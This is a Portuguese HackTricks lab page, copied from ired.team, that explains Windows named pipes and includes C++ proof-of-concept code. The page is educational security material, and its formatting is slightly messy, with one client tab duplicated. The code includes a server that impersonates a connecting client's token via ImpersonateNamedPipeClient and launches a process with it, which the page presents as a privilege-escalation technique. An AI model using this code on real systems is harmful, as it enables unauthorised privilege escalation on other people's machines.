## Impersonação de Cliente de Pipe Nomeado

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Esta informação foi copiada de** [**https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation**](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)

## Visão Geral

Um `pipe` é um bloco de memória compartilhada que os processos podem usar para comunicação e troca de dados.

`Named Pipes` é um mecanismo do Windows que permite que dois processos não relacionados troquem dados entre si, mesmo que os processos estejam localizados em duas redes diferentes. É muito semelhante à arquitetura cliente/servidor, pois existem noções como `um servidor de pipe nomeado` e um `cliente de pipe nomeado`.

Um servidor de pipe nomeado pode abrir um pipe nomeado com um nome pré-definido e, em seguida, um cliente de pipe nomeado pode se conectar a esse pipe por meio do nome conhecido. Uma vez estabelecida a conexão, a troca de dados pode começar.

Este laboratório trata de um código PoC simples que permite:

* criar um servidor de pipe nomeado burro com uma única thread que aceitará uma conexão de cliente
* servidor de pipe nomeado escrever uma mensagem simples no pipe nomeado para que o cliente de pipe possa lê-la

## Código

Abaixo está o PoC para o servidor e o cliente:

{% tabs %}
{% tab title="namedPipeServer.cpp" %}
```cpp
#include "pch.h"
#include <Windows.h>
#include <iostream>

int main() {
	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
	LPVOID pipeBuffer = NULL;
	HANDLE serverPipe;
	DWORD readBytes = 0;
	DWORD readBuffer = 0;
	int err = 0;
	BOOL isPipeConnected;
	BOOL isPipeOpen;
	wchar_t message[] = L"HELL";
	DWORD messageLenght = lstrlen(message) * 2;
	DWORD bytesWritten = 0;

	std::wcout << "Creating named pipe " << pipeName << std::endl;
	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
	
	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
	if (isPipeConnected) {
		std::wcout << "Incoming connection to " << pipeName << std::endl;
	}
	
	std::wcout << "Sending message: " << message << std::endl;
	WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
	
	return 0;
}
```
{% endtab %}

{% tab title="namedPipeClient.cpp" %}

```cpp
#include <windows.h>
#include <stdio.h>
#include <tchar.h>

#define BUFSIZE 512

int _tmain(int argc, TCHAR *argv[])
{
   HANDLE hPipe;
   LPTSTR lpvMessage=TEXT("Default message from client.");
   TCHAR chBuf[BUFSIZE];
   BOOL fSuccess = FALSE;
   DWORD cbRead, cbToWrite, cbWritten, dwMode;
   LPTSTR lpszPipename = TEXT("\\\\.\\pipe\\mynamedpipe");

   if( argc > 1 )
      lpvMessage = argv[1];

   // Try to open a named pipe; wait for it, if necessary.

   while (1)
   {
      hPipe = CreateFile(
         lpszPipename,   // pipe name
         GENERIC_READ |  // read and write access
         GENERIC_WRITE,
         0,              // no sharing
         NULL,           // default security attributes
         OPEN_EXISTING,  // opens existing pipe
         0,              // default attributes
         NULL);          // no template file

      // Break if the pipe handle is valid.

      if (hPipe != INVALID_HANDLE_VALUE)
         break;

      // Exit if an error other than ERROR_PIPE_BUSY occurs.

      if (GetLastError() != ERROR_PIPE_BUSY)
      {
         _tprintf( TEXT("Could not open pipe. GLE=%d\n"), GetLastError() );
         return -1;
      }

      // All pipe instances are busy, so wait for 20 seconds.

      if ( ! WaitNamedPipe(lpszPipename, 20000))
      {
         printf("Could not open pipe: 20 second wait timed out.");
         return -1;
      }
   }

   // The pipe connected; change to message-read mode.

   dwMode = PIPE_READMODE_MESSAGE;
   fSuccess = SetNamedPipeHandleState(
      hPipe,    // pipe handle
      &dwMode,  // new pipe mode
      NULL,     // don't set maximum bytes
      NULL);    // don't set maximum time

   if ( ! fSuccess)
   {
      _tprintf( TEXT("SetNamedPipeHandleState failed. GLE=%d\n"), GetLastError() );
      return -1;
   }

   // Send a message to the pipe server.

   cbToWrite = (lstrlen(lpvMessage)+1)*sizeof(TCHAR);
   _tprintf( TEXT("Sending %d byte message: \"%s\"\n"), cbToWrite, lpvMessage);

   fSuccess = WriteFile(
      hPipe,                  // pipe handle
      lpvMessage,             // message
      cbToWrite,              // message length
      &cbWritten,             // bytes written
      NULL);                  // not overlapped

   if ( ! fSuccess)
   {
      _tprintf( TEXT("WriteFile to pipe failed. GLE=%d\n"), GetLastError() );
      return -1;
   }

   printf("\nMessage sent to server, receiving reply as follows:\n");

   do
   {
      // Read from the pipe.

      fSuccess = ReadFile(
         hPipe,    // pipe handle
         chBuf,    // buffer to receive reply
         BUFSIZE*sizeof(TCHAR),  // size of buffer
         &cbRead,  // number of bytes read
         NULL);    // not overlapped

      if ( ! fSuccess && GetLastError() != ERROR_MORE_DATA )
         break;

      _tprintf( TEXT("\"%s\"\n"), chBuf );
   } while ( ! fSuccess);  // repeat loop if ERROR_MORE_DATA

   if ( ! fSuccess)
   {
      _tprintf( TEXT("ReadFile from pipe failed. GLE=%d\n"), GetLastError() );
      return -1;
   }

   _tprintf( TEXT("\n<End of message, press ENTER to terminate connection and exit>") );
   _getch();

   CloseHandle(hPipe);

   return 0;
}
```

{% endtab %}

{% tab title="namedPipeClient.cpp" %}

```cpp
#include <windows.h>
#include <stdio.h>
#include <tchar.h>

#define BUFSIZE 512

int _tmain(int argc, TCHAR *argv[])
{
   HANDLE hPipe;
   LPTSTR lpvMessage=TEXT("Mensagem padrão do cliente.");
   TCHAR chBuf[BUFSIZE];
   BOOL fSuccess = FALSE;
   DWORD cbRead, cbToWrite, cbWritten, dwMode;
   LPTSTR lpszPipename = TEXT("\\\\.\\pipe\\mynamedpipe");

   if( argc > 1 )
      lpvMessage = argv[1];

   // Tenta abrir um named pipe; espera, se necessário.

   while (1)
   {
      hPipe = CreateFile(
         lpszPipename,   // nome do pipe
         GENERIC_READ |  // acesso de leitura e escrita
         GENERIC_WRITE,
         0,              // sem compartilhamento
         NULL,           // atributos de segurança padrão
         OPEN_EXISTING,  // abre um pipe existente
         0,              // atributos padrão
         NULL);          // sem arquivo de modelo

      // Quebra o loop se o handle do pipe for válido.

      if (hPipe != INVALID_HANDLE_VALUE)
         break;

      // Sai se ocorrer um erro diferente de ERROR_PIPE_BUSY.

      if (GetLastError() != ERROR_PIPE_BUSY)
      {
         _tprintf( TEXT("Não foi possível abrir o pipe. GLE=%d\n"), GetLastError() );
         return -1;
      }

      // Todas as instâncias do pipe estão ocupadas, então espera por 20 segundos.

      if ( ! WaitNamedPipe(lpszPipename, 20000))
      {
         printf("Não foi possível abrir o pipe: tempo de espera de 20 segundos esgotado.");
         return -1;
      }
   }

   // O pipe conectou; muda para o modo de leitura de mensagem.

   dwMode = PIPE_READMODE_MESSAGE;
   fSuccess = SetNamedPipeHandleState(
      hPipe,    // handle do pipe
      &dwMode,  // novo modo do pipe
      NULL,     // não define o número máximo de bytes
      NULL);    // não define o tempo máximo

   if ( ! fSuccess)
   {
      _tprintf( TEXT("SetNamedPipeHandleState falhou. GLE=%d\n"), GetLastError() );
      return -1;
   }

   // Envia uma mensagem para o servidor do pipe.

   cbToWrite = (lstrlen(lpvMessage)+1)*sizeof(TCHAR);
   _tprintf( TEXT("Enviando mensagem de %d bytes: \"%s\"\n"), cbToWrite, lpvMessage);

   fSuccess = WriteFile(
      hPipe,                  // handle do pipe
      lpvMessage,             // mensagem
      cbToWrite,              // tamanho da mensagem
      &cbWritten,             // bytes escritos
      NULL);                  // não é sobreposto

   if ( ! fSuccess)
   {
      _tprintf( TEXT("WriteFile para o pipe falhou. GLE=%d\n"), GetLastError() );
      return -1;
   }

   printf("\nMensagem enviada para o servidor, recebendo resposta da seguinte forma:\n");

   do
   {
      // Lê do pipe.

      fSuccess = ReadFile(
         hPipe,    // handle do pipe
         chBuf,    // buffer para receber a resposta
         BUFSIZE*sizeof(TCHAR),  // tamanho do buffer
         &cbRead,  // número de bytes lidos
         NULL);    // não é sobreposto

      if ( ! fSuccess && GetLastError() != ERROR_MORE_DATA )
         break;

      _tprintf( TEXT("\"%s\"\n"), chBuf );
   } while ( ! fSuccess);  // repete o loop se ERROR_MORE_DATA

   if ( ! fSuccess)
   {
      _tprintf( TEXT("ReadFile do pipe falhou. GLE=%d\n"), GetLastError() );
      return -1;
   }

   _tprintf( TEXT("\n<Fim da mensagem, pressione ENTER para encerrar a conexão e sair>") );
   _getch();

   CloseHandle(hPipe);

   return 0;
}
```

{% endtab %}
```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>

const int MESSAGE_SIZE = 512;

int main()
{
	LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
	HANDLE clientPipe = NULL;
	BOOL isPipeRead = true;
	wchar_t message[MESSAGE_SIZE] = { 0 };
	DWORD bytesRead = 0;

	std::wcout << "Connecting to " << pipeName << std::endl;
	clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	
	while (isPipeRead) {
		isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
		std::wcout << "Received message: " << message;
	}

	return 0;
}
```
{% endtab %}
{% endtabs %}

## Execução

Abaixo mostra o servidor de pipe nomeado e o cliente de pipe nomeado funcionando como esperado:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22.png>)

Vale ressaltar que a comunicação de pipes nomeados por padrão usa o protocolo SMB:

![](<../../.gitbook/assets/Screenshot from 2019-04-04 23-51-48.png>)

Verificando como o processo mantém um identificador para o nosso pipe nomeado `mantvydas-first-pipe`:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (1).png>)

Da mesma forma, podemos ver o cliente tendo um identificador aberto para o pipe nomeado:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (2).png>)

Podemos até ver nosso pipe com powershell:
```csharp
((Get-ChildItem \\.\pipe\).name)[-1..-5]
```
![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (3).png>)

## Impersonação de Token

{% hint style="info" %}
Observe que, para impessoar o token do processo do cliente, você precisa ter (o processo do servidor criando o pipe) o privilégio do token **`SeImpersonate`**
{% endhint %}

É possível para o servidor de pipe nomeado impessoar o contexto de segurança do cliente de pipe nomeado, aproveitando uma chamada de API `ImpersonateNamedPipeClient`, que por sua vez altera o token do thread atual do servidor de pipe nomeado com o token do cliente de pipe nomeado.

Podemos atualizar o código do servidor de pipe nomeado assim para alcançar a impessoação - observe que as modificações são vistas na linha 25 e abaixo:
```cpp
int main() {
	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
	LPVOID pipeBuffer = NULL;
	HANDLE serverPipe;
	DWORD readBytes = 0;
	DWORD readBuffer = 0;
	int err = 0;
	BOOL isPipeConnected;
	BOOL isPipeOpen;
	wchar_t message[] = L"HELL";
	DWORD messageLenght = lstrlen(message) * 2;
	DWORD bytesWritten = 0;

	std::wcout << "Creating named pipe " << pipeName << std::endl;
	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
	
	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
	if (isPipeConnected) {
		std::wcout << "Incoming connection to " << pipeName << std::endl;
	}
	
	std::wcout << "Sending message: " << message << std::endl;
	WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
	
	std::wcout << "Impersonating the client..." << std::endl;
	ImpersonateNamedPipeClient(serverPipe);
	err = GetLastError();	

	STARTUPINFO	si = {};
	wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
	PROCESS_INFORMATION pi = {};
	HANDLE threadToken = GetCurrentThreadToken();
	CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	return 0;
}
```
Executando o servidor e conectando-se a ele com o cliente que está sendo executado sob o contexto de segurança administrator@offense.local, podemos ver que a thread principal do pipe do servidor nomeado assumiu o token do cliente do pipe nomeado - offense\administrator, embora o PipeServer.exe em si esteja sendo executado sob o contexto de segurança ws01\mantvydas. Parece ser uma boa maneira de escalar privilégios?
